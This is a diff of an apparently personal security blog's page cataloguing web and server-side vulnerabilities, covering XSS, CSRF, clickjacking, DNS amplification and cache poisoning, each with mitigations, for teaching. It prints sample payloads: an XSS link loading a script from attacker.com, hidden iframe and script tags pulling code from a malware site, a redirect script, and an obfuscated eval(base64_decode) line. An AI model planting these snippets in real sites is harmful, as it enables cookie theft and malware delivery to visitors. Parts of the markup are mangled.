@@ -114,27 +114,84 @@
 	<a href="http://bt3gl.github.io/tag/buffer_overflow.html"><i class="icon-tag"></i>Buffer_Overflow</a>
 	<a href="http://bt3gl.github.io/tag/lfi.html"><i class="icon-tag"></i>LFI</a>
 	<a href="http://bt3gl.github.io/tag/rfi.html"><i class="icon-tag"></i>RFI</a>
+	<a href="http://bt3gl.github.io/tag/iframe.html"><i class="icon-tag"></i>iframe</a>
+	<a href="http://bt3gl.github.io/tag/sqli.html"><i class="icon-tag"></i>SQLi</a>
 </footer><!-- /.post-info -->                </div>
-                <p>Although nomenclatures don't help  much when you facing a security problem, I am keeping this list here for some useful organization. It is constantly been updated.</p>
-<h2>Vulnerabilities to Web Applications</h2>
-<h3>Cross-site Scripting (XSS)</h3>
-<p>HTML has five characters that are reserved: angle brackets, single and double quotes, and ampersand. The ampersand should never appear in most HTML sections. Both angle brackets shouldn't be used inside a tag, unless  properly quoted. Quote characters inside a tag can also be harmless in text. To allow these characters to appear in problematic locations, an encoding based in an ampersand-prefixed and a semicolon-terminated scheme is used: the <a href="http://www.w3schools.com/html/html_entities.asp">Entity Encoding</a>.</p>
-<p>XSS is caused by  insufficient input validation or output escaping. This can allow an attacker to insert HTML markup or scripts in a vulnerable website. The injected  code will have plenty of access in this site, and in many cases, to the HTTP cookies stored by the client.</p>
-<h4>Example of exploitation:</h4>
+                <p>Although nomenclatures don't help  much when you facing a security problem, I am keeping this list for a systematic organization organization. It is constantly been updated.</p>
+<p>In addition to this list, you can check some specific web exploration older posts: <a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html">Exploiting the web in 20 lessons</a> and <a href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html">D-Camp CTF 2014</a>.</p>
+<h1>Vulnerabilities to Web Applications</h1>
+<h2>Cross-site Scripting (XSS)</h2>
+<p>XSS is caused by <strong>insufficient input validation or output escaping</strong>. This can allow an attacker to insert HTML markup or scripts in a vulnerable website. The injected  code will have plenty of access in this site, and in many cases, to the HTTP cookies stored by the client.</p>
+<p>HTML has five characters that are reserved:
+<em> <strong>both angle brackets</strong>,
+</em> <strong>single and double quotes</strong>,
+* and <strong>ampersand</strong>.</p>
+<p>The ampersand should never appear in most HTML sections. Both angle brackets should not be used inside a tag, unless  properly quoted. Quote characters inside a tag can also be harmless in text.</p>
+<p>To allow these characters to appear in problematic locations, an encoding based in an ampersand-prefixed and a semicolon-terminated scheme is used: the <a href="http://www.w3schools.com/html/html_entities.asp">Entity Encoding</a>.</p>
+<h3>Non-Persistent Attack:</h3>
+<p>XSS non-persistent attacks consist on getting users to click a link with attacker's script. A typical scenario is the following:</p>
+<ol>
+<li>The target website perform  query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message <strong>Pwnd</strong> is displayed:</li>
+</ol>
+<div class="highlight"><pre><span class="nx">http</span><span class="p">:</span><span class="c1">//website.org?q=&lt;script%20type=&#39;text/javascript&#39;&gt;alert(&#39;Pwnd!&#39;);&lt;/script&gt;</span>
+</pre></div>
+
+
+<ol>
+<li>The attacker craft an exploit script that gets the victim's authorization information (for example in an <strong>Authorization Cookie</strong>). The attacker sends a <strong>phishing email</strong> to the victim with a link with some script such as:</li>
+</ol>
+<div class="highlight"><pre><span class="nl">http:</span><span class="c1">//website.org?q=puppies&lt;script%20src=&quot;http://attacker.com/exploit.js&quot;&gt;</span>
+</pre></div>
+
+
+<ol>
+<li>If the victim clicks in the link, her/his browser runs the script (legitimate by the <strong>Same Origin Policy</strong>, <em>i.e</em> resources are shared between origins with same protocol, domain and port).  The attacker now has control of the victim's identity in that website. If the victim is the administrator, it is game over.</li>
+</ol>
+<h3>Persistent Attack:</h3>
+<p>XSS persistent attacks store a malicious script in the databases, which will retrieved by the users. A typical scenario is the following:</p>
+<ol>
+<li>
+<p>The attacker verifies that the target website has a XSS stored vulnerability (for example, allowing her/him to post text with HTML tags).</p>
+</li>
+<li>
+<p>The attacker creates an account in the target website and posts something with a hidden script (similar to the one above).</p>
+</li>
+<li>
+<p>When anyone loads the page with that post, the script runs, and the attacker is able to hijack the victim's section.</p>
+</li>
+</ol>
+<p>Additionally, in <em>password managers</em>, there is a risk of  amplification of XSS bugs. In the web applications that use <em><a href="https://www.owasp.org/index.php/HttpOnly">httponly</a></em> cookies, a successful exploitation of an XSS flaw may give the attacker a transient access to the user's account (and password).</p>
+<h3>Attempts of mitigation:</h3>
 <ul>
-<li>In <em>password managers</em>, there is a risk of  amplification of XSS bugs. In the web applications that use <em><a href="https://www.owasp.org/index.php/HttpOnly">httponly</a></em> cookies, a successful exploitation of an XSS flaw may give the attacker a transient access to the user's account (and password).</li>
+<li>
+<p>Servers should should use <strong>Content Security Policy</strong> (CSP) HTTP header, which allow the whitlist of resources contents. For instance, the <em>Content-Security-Policy</em> header disables inline JavaScript by default.</p>
+</li>
+<li>
+<p>Servers can use the <strong>HttpOnly</strong> HTTP header which allows to set a cookie that is unavailable to client-side scripts.</p>
+</li>
+<li>
+<p>Search inputs should <em>always</em> be sanitized in both server-side and client-side.</p>
+</li>
+<li>
+<p>Servers should redirect invalid requests.</p>
+</li>
+<li>
+<p>Servers should invalidate sessions from different IP addresses. However this can be mitigate if the attacker is behind a web proxy or behind the same NAT IP.</p>
+</li>
+<li>
+<p>Clients should disabling scripts by default (for example with <a href="https://addons.mozilla.org/en-us/firefox/addon/noscript/">NoScript</a>).</p>
+</li>
 </ul>
-<h4>Attempts of mitigation:</h4>
-<ul>
-<li>XSS filtering:  implementations that compare portions of the current URL with any string appearing on the retrieved page or passed to APIs such as <em><a href="http://www.w3schools.com/jsref/met_doc_write.asp">document.write()</a></em> and <em><a href="http://www.w3schools.com/jsref/prop_html_innerhtml.asp">innerHTML</a></em>. If the comparison reveals a portion of JavaScript that may have originated with improperly escaped URL, the portion is substituted by a harmless string. However, the filter may also append  legitimate portion of the page as a non-functional parameter in the URL. In some cases, this can create XSS vectors! One should not rely on this mechanism.</li>
-</ul>
-<h3>Cross Script Inclusion (XSSI)</h3>
-<p>JSON is a JavaScript syntax structure  to keep in-place object serialization.  The curly bracket <strong>{</strong> is assumed to be the beginning of the object. Overloading curly  brackets means that JSON blocks will not be recognized properly in standalone statements.</p>
-<p>XSSI comes with the failure to secure sensitive JSON-like responses against being loaded on third-party sites via <code>&lt;script src=..&gt;</code>, and leaking user-specific information in the response. It a risk whenever ambient authority credentials (such as cookies) are used by the server to generate user-specific JavaScript code.</p>
-<h3>Cross-site Request Forgery (CSRF, XSRF)</h3>
+<hr />
+<h2>Cross Script Inclusion (XSSI)</h2>
+<p>XSSI comes with the failure to secure sensitive JSON-like responses against being loaded on third-party sites via <code>&lt;script src=..&gt;</code>, and leaking user-specific information in the response. It a risk whenever ambient authority credentials (such as cookies) are used by the server to generate user-specific JavaScript code.
+JSON is a JavaScript syntax structure  to keep in-place object serialization.  The curly bracket <strong>{</strong> is assumed to be the beginning of the object. Overloading curly  brackets means that JSON blocks will not be recognized properly in standalone statements.
+For instance,</p>
+<hr />
+<h2>Cross-site Request Forgery (CSRF, XSRF)</h2>
+<p>CSRF allows attackers to execute actions using the credentials of another user without that user's knowledge or consent. It is  the failure to verify that a particular state-changing HTTP request received by the <strong>server-side</strong> portion of the application was initiated from the expected <strong>client-side</strong> origin. Any third-party website loaded in the browser can perform actions in behalf of the victim.</p>
 <p>On cross-domain navigation, the browser includes any ambient credentials. To the server, a request originating from its own client-side code will appear as the same as the request from a rogue third-party site and  it might be granted the same privilege.</p>
-<p>CSRF is the failure to verify that a particular state-changing HTTP request received by the <strong>server-side</strong> portion of the application was initiated from the expected <strong>client-side</strong> origin. Any third-party website loaded in the browser can perform actions in behalf of the victim.</p>
-<h4>Examples of exploitation:</h4>
+<h3>Examples of exploitation:</h3>
 <ul>
 <li>
 <p>Any two windows of frames opened in a browser will remain <a href="http://en.wikipedia.org/wiki/Same-origin_policy">same-origin</a> with each other even if the user logs out from one account and permitting third-party to submit password and username and log int an attacked account. For example, the attacker can open and keep a frame pointing to a sensitive page and then log the victim into the attacker-controlled account to execute some code injection. Despite the change of  HTTP credentials the code injected will access the previous loaded frame.</p>
@@ -143,77 +200,172 @@
 <p>In several home network routers, CSRF can permit attackers to access the device and intercept or modify the network traffic.</p>
 </li>
 </ul>
-<h4>Attempts of mitigation:</h4>
+<h3>Attempts of mitigation:</h3>
 <ul>
-<li>Including a secret user- and session- specific value on the requests (as an additional query parameter or a hidden field). The attacker will not be able to read the value since access to cross-domain documents is restricted by the <strong>same-origin</strong> policy.</li>
+<li>
+<p>A protection can be done by checking a nonce in each POST request (no replay attacks in a form POST).</p>
+</li>
+<li>
+<p>Including a secret user- and session- specific value on the requests (as an additional query parameter or a hidden field). The attacker will not be able to read the value since access to cross-domain documents is restricted by the <strong>same-origin</strong> policy.</p>
+</li>
 </ul>
-<h3>Header Injection (Response Splitting)</h3>
+<hr />
+<h2>Header Injection (Response Splitting)</h2>
 <p>Insufficient escaping of newlines in HTTP responses, generated by the server-side. This can lead to XSS or proxy cache poisoning.</p>
-<h4>Attempts of mitigation:</h4>
+<h3>Attempts of mitigation:</h3>
 <ul>
 <li>LF and CR characters must be stripped from any attacker-controlled values in the HTTP headers.</li>
 </ul>
-<h3>Mixed Content</h3>
+<hr />
+<h2>Mixed Content</h2>
 <p>Loading non-HTTPS sub-resources on HTTPS pages undoes most of the benefits of encryption. For scripts and applets, this makes the application vulnerable to active attackers, specially in open wireless networks.</p>
-<h3>Open Redirection</h3>
+<hr />
+<h2>Open Redirection</h2>
 <p>Applications that perform HTTP- or script-based requests to user-supplied URLs without constraining the possible destinations in any meaningful way, leading, for example, to XSS.</p>
-<h3>Referer Leakage</h3>
+<hr />
+<h2>Referer Leakage</h2>
 <p>HTTP requests may include a <em>Referer</em> header that contains the URL of documents that triggered the current navigation in some way. The header also may reveal some information about the user browsing habits, such as query parameters in the referring page.</p>
 <p>This vulnerability is created by disclosure of a sensitive URL by embedding an off-site sub-resource of providing an off-site link. Any security data encoded in the URL of the parent document will be leaked in the <em>Referer</em> header.</p>
 <hr />
-<h2>Vulnerabilities to Web Application Design</h2>
-<h3>Cache Poising</h3>
+<h1>Vulnerabilities to Web Application Design</h1>
+<h2>Cache Poising</h2>
 <p>Long-term pollution of the browser cache (or any proxy within) with a malicious version of the targeted web application. Encrypted web applications may be targeted due to response-splitting vulnerabilities. In non-encrypted traffic, network attackers may be able to modify responses too.</p>
-<h3>Clickjacking</h3>
-<p>The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site.</p>
-<h3>Content and Character Set Sniffing</h3>
+<hr />
+<h2>Clickjacking</h2>
+<p>The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site. For example, a malicious site wraps another site in a frame.</p>
+<p>If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:</p>
+<div class="highlight"><pre><span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">blog_posts</span> <span class="n">WHERE</span> <span class="n">post_text</span> <span class="n">LIKE</span> <span class="err">&#39;</span><span class="o">%&gt;</span><span class="n">iframe</span><span class="o">%</span><span class="err">&#39;</span><span class="p">;</span>
+</pre></div>
+
+
+<hr />
+<h2>Content and Character Set Sniffing</h2>
 <p>Possibility that the browser will ignore any authoritative content type of character set information provided by the server and interpret the returned document incorrectly.</p>
-<h4>Examples of exploitation:</h4>
+<h3>Examples of exploitation:</h3>
 <ul>
 <li>Scenarios where <a href="http://www.w3.org/Protocols/rfc1341/4_Content-Type.html">Content-Type</a> is ignored.</li>
 </ul>
-<h3>Cookie Forcing/Injection</h3>
+<hr />
+<h2>Cookie Forcing/Injection</h2>
 <p>Possibility of blindly injecting HTTP cookies into the context of an otherwise impenetrable web application due to issues in how the mechanism is designed and implemented in  browsers. There are special concern to HTTPS applications.</p>
-<h4>Examples of exploitation:</h4>
+<h3>Examples of exploitation:</h3>
 <ul>
 <li>Cookie stuffing: deleting cookies belonging to another applications by overflowing the cookie jar.</li>
 </ul>
-<h3>Denial-of-Service (DoS)</h3>
+<hr />
+<h2>Denial-of-Service (DoS)</h2>
 <p>Any opportunity of the attacker to bring down a browser or server, or make the use of a targeted application  more difficult.</p>
-<h3>Framebusting</h3>
+<h3>DoS and amplification attacks</h3>
+<p>DNS resolvers are attractive targets to attackers who exploit the resolvers' large response-to-request size ratio to gain additional free bandwidth. Resolvers that support EDNS0 (Extension Mechanisms for DNS) are especially vulnerable because of the substantially larger packet size that they can return.</p>
+<h3>Examples of exploitation:</h3>
+<p>In an amplification scenario, the attack proceeds as follows:</p>
+<ul>
+<li>The attacker sends a victim DNS server queries using a forged source IP address. The queries may be sent from a single system or a network of systems all using the same forged IP address. The queries are for records that the attacker knows will result in much larger responses, up to several dozen times1 the size of the original queries..</li>
+<li>The victim server sends the large responses to the source IP address passed in the forged requests, overwhelming the system and causing a DoS situation.</li>
+</ul>
+<hr />
+<h2>Framebusting</h2>
 <p>The possibility of a framed page navigating the top-level document to a new URL without having to satisfy <strong>same-origin</strong> checks. It might be exploited for phishing.</p>
-<h3>HTTP Downgrade</h3>
+<hr />
+<h2>HTTP Downgrade</h2>
 <p>Ability of an attacker to prevent the user from reaching an HTTPS version of a site or to downgrade an existing HTTPS session to HTTP.</p>
-<h4>Attempts of mitigation:</h4>
+<h3>Attempts of mitigation:</h3>
 <ul>
 <li><a href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">Strict transport security</a>:  The approach allows any site to instruct the browser that all future requests made to a particular hostname or domain should always use HTTPS and that any HTTP traffic should be automatically upgraded and submitted over  HTTPS.</li>
 </ul>
-<h3>Network Fenceposts</h3>
+<hr />
+<h2>Network Fenceposts</h2>
 <p>When websites let the browser to interact with destinations not directly accessible to the attacker, for example, with the systems on a victim's internal networks. This attack can be performed with help of <a href="http://en.wikipedia.org/wiki/DNS_rebinding">DNS rebinding</a>.</p>
-<h4>Attempts of mitigation:</h4>
+<h2>Attempts of mitigation:</h2>
 <ul>
 <li>Internet Explorer implements the zone model, a potential approach to the risk.</li>
 </ul>
 <hr />
-<h2>Vulnerabilities in the Server-Side</h2>
-<h3>Buffer Overflow</h3>
+<h1>Vulnerabilities in the Server-Side</h1>
+<h2>Buffer Overflow</h2>
 <p>In low-level languages such as C or C++, buffer overflow happens when a program allows more information to be stored in a particular memory region than there is space to accommodate the incoming data, leading to the unexpected overwrite of other vital data structures.</p>
-<h3>Command Injection (SQL, PHP, Shellcode)</h3>
+<hr />
+<h2>Command Injection (SQL, PHP, Shellcode)</h2>
 <p>Due to insufficient input filtering or output escaping, an attacker-controlled strings may be processed as statements in an interpreted language used by the application.</p>
-<h3>Directory Traversal</h3>
+<h3>Examples of exploitation:</h3>
+<ul>
+<li>Malicious code injections in an iframe to the attack site:</li>
+</ul>
+<div class="highlight"><pre><span class="nt">&lt;iframe</span> <span class="na">frameborder=</span><span class="s">&quot;0&quot;</span> <span class="na">height=</span><span class="s">&quot;0&quot;</span> <span class="na">src=</span><span class="s">&quot;http://&lt;attack-site&gt;/path/file&quot;</span> <span class="na">style=</span><span class="s">&quot;display:none&quot;</span> <span class="na">width=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>JavaScript or another scripting language that calls and runs scripts from an attack site:</li>
+</ul>
+<div class="highlight"><pre><span class="nt">&lt;script</span> <span class="na">type=</span><span class="s">&#39;text/javascript&#39;</span> <span class="na">src=</span><span class="s">&#39;http://malware-attack-site/js/x55.js&#39;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>Scripts that redirects the browser to an attack site:</li>
+</ul>
+<div class="highlight"><pre><span class="nt">&lt;script&gt;</span>
+  if (document.referrer.match(/google\.com/)) {
+    window.location(&quot;http://malware-attack-site/&quot;);
+  }
+<span class="nt">&lt;/script&gt;</span>
+``
+
+* Malicious code that is obfuscated to avoid detection:
+</pre></div>
+
+
+<p>eval(base64_decode("aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf"));</p>
+<div class="highlight"><pre><span class="o">*</span> <span class="n">Shared</span> <span class="n">object</span> <span class="n">files</span> <span class="n">designed</span> <span class="n">to</span> <span class="n">randomly</span> <span class="n">write</span> <span class="n">harmful</span> <span class="n">code</span> <span class="n">to</span> <span class="n">otherwise</span> <span class="n">benign</span> <span class="n">scripts</span><span class="o">:</span>
+</pre></div>
+
+
+<h1>httpd.conf modified by the hacker</h1>
+<p>LoadModule harmful_module modules/mod_harmful.so
+AddModule mod_harmful.c</p>
+<div class="highlight"><pre><span class="o">*</span> <span class="n">The</span> <span class="o">**</span><span class="n">Error</span> <span class="n">template</span> <span class="n">type</span> <span class="n">of</span> <span class="n">malware</span> <span class="n">infection</span><span class="o">**</span> <span class="n">occurs</span> <span class="n">when</span> <span class="n">the</span> <span class="n">template</span> <span class="n">used</span> <span class="k">for</span> <span class="n">error</span> <span class="n">messages</span><span class="p">,</span> <span class="n">such</span> <span class="n">as</span> <span class="mi">404</span> <span class="n">File</span> <span class="n">not</span> <span class="n">Found</span><span class="p">,</span> <span class="n">is</span> <span class="n">configured</span> <span class="n">to</span> <span class="n">distribute</span> <span class="n">malware</span><span class="p">.</span> <span class="n">In</span> <span class="n">this</span> <span class="n">way</span><span class="p">,</span> <span class="n">attackers</span> <span class="n">can</span> <span class="n">launch</span> <span class="n">attacks</span> <span class="n">on</span> <span class="n">URLs</span> <span class="n">that</span> <span class="k">do</span> <span class="n">not</span> <span class="n">even</span> <span class="n">exist</span> <span class="n">on</span> <span class="n">the</span> <span class="n">victim</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">website</span><span class="p">.</span>
+
+<span class="cp">## Attempts of mitigation:</span>
+<span class="o">*</span> <span class="n">Investigate</span> <span class="n">all</span> <span class="n">possible</span> <span class="n">harmful</span> <span class="n">code</span> <span class="n">on</span> <span class="n">the</span> <span class="n">website</span><span class="p">.</span> <span class="n">It</span> <span class="n">may</span> <span class="n">be</span> <span class="n">helpful</span> <span class="n">to</span> <span class="n">search</span> <span class="k">for</span> <span class="n">words</span> <span class="n">like</span> <span class="p">[</span><span class="n">iframe</span><span class="p">]</span> <span class="n">to</span> <span class="n">find</span> <span class="n">iframe</span> <span class="n">code</span><span class="p">.</span> <span class="n">Other</span> <span class="n">helpful</span> <span class="n">keywords</span> <span class="n">are</span> <span class="s">&quot;script&quot;</span><span class="p">,</span> <span class="s">&quot;eval&quot;</span><span class="p">,</span> <span class="n">and</span> <span class="s">&quot;unescape.&quot;</span> <span class="n">For</span> <span class="n">example</span><span class="p">,</span> <span class="n">on</span> <span class="n">Unix</span><span class="o">-</span><span class="n">based</span> <span class="n">systems</span><span class="o">:</span>
+
+<span class="err">```</span><span class="n">sh</span>
+<span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">irn</span> <span class="s">&quot;iframe&quot;</span> <span class="p">.</span><span class="o">/</span> <span class="o">|</span> <span class="n">less</span>
+</pre></div>
+
+
+<hr />
+<h2>Directory Traversal</h2>
 <p>Due to insufficient filtering (such as the failure to recognize <code>../</code> segments) an application can be tricked into reading or writing files at arbitrary locations. Unconstrained file-writing bugs can be exploitable to run attacker-supplied code.</p>
-<h3>File Inclusion</h3>
+<hr />
+<h2>File Inclusion</h2>
 <p>If used without a qualifier or prefixed with a <em>local</em> (LFI), the term is synonymous to read-related directory traversal. Remote file inclusion (RFI) is an alternative way to exploit file-inclusion vulnerabilities by specifying a URL rather than a valid file path. In some languages, a common API opens local files and fetches remote URLS, which might supplies the ability of retrieving attacker's files.</p>
-<h3>Format String Vulnerability</h3>
+<hr />
+<h2>Format String Vulnerability</h2>
 <p>Several libraries accept templates (format strings) followed by a set of parameters that the function is expected to insert into the template at predefined locations. For example,  C has functions such as <em>printf</em>, <em>syslog</em>, etc. The vulnerability is caused by permitting attackers to supply the template to one of these functions. This can lead to  data leaks and code execution.</p>
-<h3>Integer Overflow</h3>
+<hr />
+<h2>Integer Overflow</h2>
 <p>Vulnerability specific to languages with no range checking. The flaw is caused by the developer failing to detect that an integer exceeded the maximum possible value and rolled back to zero, to a large negative integer, or to some hardware-specific  result.</p>
 <p>Integer underflow is the opposite effect: crossing the minimum value and rolling over to a very large positive integer.</p>
-<h3>Pointer Management Vulnerabilities</h3>
+<hr />
+<h2>Pointer Management Vulnerabilities</h2>
 <p>In languages that use raw memory pointers such as C or C++, it is possible to use pointers that are either unitized or nor longer valid (dangling). These vulnerabilities will corrupt the internal state of the program and allow an attacker to execute attacker-supplied code.</p>
 <hr />
-<h3>References:</h3>
-<p><a href="http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886">The Tangled Web</a></p>
+<h2>Cache poisoning attacks</h2>
+<p>There are several variants of DNS spoofing attacks that can result in cache poisoning, but the general scenario is as follows:</p>
+<p>The attacker sends a target DNS resolver multiple queries for a domain name for which s/he knows the server is not authoritative, and that is unlikely to be in the server's cache.
+The resolver sends out requests to other nameservers (whose IP addresses the attacker can also predict).
+In the meantime, the attacker floods the victim server with forged responses that appear to originate from the delegated nameserver. The responses contain records that ultimately resolve the requested domain to IP addresses controlled by the attacker. They might contain answer records for the resolved name or, worse, they may further delegate authority to a nameserver owned by the attacker, so that s/he takes control of an entire zone.
+If one of the forged responses matches the resolver's request (for example, by query name, type, ID and resolver source port) and is received before a response from the genuine nameserver, the resolver accepts the forged response and caches it, and discards the genuine response.
+Future queries for the compromised domain or zone are answered with the forged DNS resolutions from the cache. If the attacker has specified a very long time-to-live on the forged response, the forged records stay in the cache for as long as possible without being refreshed.</p>
+<hr />
+<h1>References:</h1>
+<ul>
+<li><a href="http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886">The Tangled Web</a></li>
+<li><a href="https://docs.djangoproject.com/en/dev/topics/security/">Django Security</a></li>
+<li><a href="https://docs.djangoproject.com/en/dev/topics/security/">Bleach: Sanitizing Tool in Python</a></li>
+<li><a href="https://developers.google.com/speed/public-dns/docs/security">Google's Public DNS</a></li>
+</ul>
                 </div><!-- /.entry-content -->
                 <div class="comments">
                 <h2>Comments !</h2>
@@ -280,343 +432,8 @@
 <li class="nav-header"><h4>Tags</h4></li>
 <ul class="tagcloud">
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/paillier.html">
-        <i class="icon-tag icon-large"></i>Paillier
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/ltrace.html">
-        <i class="icon-tag icon-large"></i>ltrace
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/netsh.html">
-        <i class="icon-tag icon-large"></i>netsh
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/apphp.html">
-        <i class="icon-tag icon-large"></i>ApPHP
-    </a>
-</li>
-<li class="tag-2">
-    <a href="http://bt3gl.github.io/tag/javascript.html">
-        <i class="icon-tag icon-large"></i>JavaScript
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/xss.html">
-        <i class="icon-tag icon-large"></i>XSS
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/c.html">
-        <i class="icon-tag icon-large"></i>C
-    </a>
-</li>
-<li class="tag-1">
-    <a href="http://bt3gl.github.io/tag/ctf.html">
-        <i class="icon-tag icon-large"></i>CTF
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/rfi.html">
-        <i class="icon-tag icon-large"></i>RFI
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/jad.html">
-        <i class="icon-tag icon-large"></i>jad
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/mysql.html">
-        <i class="icon-tag icon-large"></i>MySQL
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/v8.html">
-        <i class="icon-tag icon-large"></i>V8
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/tls.html">
-        <i class="icon-tag icon-large"></i>TLS
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/unicode.html">
-        <i class="icon-tag icon-large"></i>Unicode
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/decimal.html">
-        <i class="icon-tag icon-large"></i>Decimal
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/tr.html">
-        <i class="icon-tag icon-large"></i>tr
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/command_injection.html">
-        <i class="icon-tag icon-large"></i>Command_Injection
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/cain__abel.html">
-        <i class="icon-tag icon-large"></i>Cain_&_Abel
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/netcat.html">
-        <i class="icon-tag icon-large"></i>netcat
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/ssh.html">
-        <i class="icon-tag icon-large"></i>ssh
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/rips.html">
-        <i class="icon-tag icon-large"></i>RIPS
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/hope.html">
-        <i class="icon-tag icon-large"></i>Hope
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/jit.html">
-        <i class="icon-tag icon-large"></i>JIT
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/bash.html">
-        <i class="icon-tag icon-large"></i>Bash
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/telnet.html">
-        <i class="icon-tag icon-large"></i>telnet
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/cache.html">
-        <i class="icon-tag icon-large"></i>cache
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/lfi.html">
-        <i class="icon-tag icon-large"></i>LFI
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/sql_injection.html">
-        <i class="icon-tag icon-large"></i>SQL_injection
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/exiftool.html">
-        <i class="icon-tag icon-large"></i>ExifTool
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/heartbleed.html">
-        <i class="icon-tag icon-large"></i>Heartbleed
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/love.html">
-        <i class="icon-tag icon-large"></i>Love
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/rot13.html">
-        <i class="icon-tag icon-large"></i>ROT13
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/shellshock.html">
-        <i class="icon-tag icon-large"></i>Shellshock
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/arp.html">
-        <i class="icon-tag icon-large"></i>ARP
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/gpg.html">
-        <i class="icon-tag icon-large"></i>GPG
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
-        <i class="icon-tag icon-large"></i>pdf-parser
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/steganography.html">
-        <i class="icon-tag icon-large"></i>Steganography
-    </a>
-</li>
-<li class="tag-1">
-    <a href="http://bt3gl.github.io/tag/python.html">
-        <i class="icon-tag icon-large"></i>Python
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/pdftotext.html">
-        <i class="icon-tag icon-large"></i>pdftotext
-    </a>
-</li>
-<li class="tag-4">
     <a href="http://bt3gl.github.io/tag/ftp.html">
         <i class="icon-tag icon-large"></i>FTP
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/rce.html">
-        <i class="icon-tag icon-large"></i>RCE
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/chaosreader.html">
-        <i class="icon-tag icon-large"></i>Chaosreader
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/qpdf.html">
-        <i class="icon-tag icon-large"></i>qpdf
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/coldfusion.html">
-        <i class="icon-tag icon-large"></i>ColdFusion
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/iwconfig.html">
-        <i class="icon-tag icon-large"></i>iwconfig
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/chrome.html">
-        <i class="icon-tag icon-large"></i>Chrome
-    </a>
-</li>
-<li class="tag-1">
-    <a href="http://bt3gl.github.io/tag/csaw.html">
-        <i class="icon-tag icon-large"></i>CSAW
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/csrf.html">
-        <i class="icon-tag icon-large"></i>CSRF
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/xor.html">
-        <i class="icon-tag icon-large"></i>XOR
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/socket.html">
-        <i class="icon-tag icon-large"></i>socket
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/crl.html">
-        <i class="icon-tag icon-large"></i>CRL
